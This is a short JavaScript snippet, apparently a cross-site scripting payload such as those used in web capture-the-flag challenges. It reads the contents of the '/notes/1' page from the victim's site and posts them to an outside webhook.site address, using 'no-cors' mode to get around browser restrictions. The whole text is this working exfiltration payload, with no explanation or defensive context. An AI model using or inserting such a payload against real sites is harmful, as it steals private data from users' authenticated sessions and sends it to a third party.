fetch('/notes/1')
.then(r => r.text())
.then(d => fetch('https://webhook.site/2a4e63aa-4297-40aa-a983-46ee14dc0f24', {
    method: 'POST',
    mode: 'no-cors',
    body: d
}))
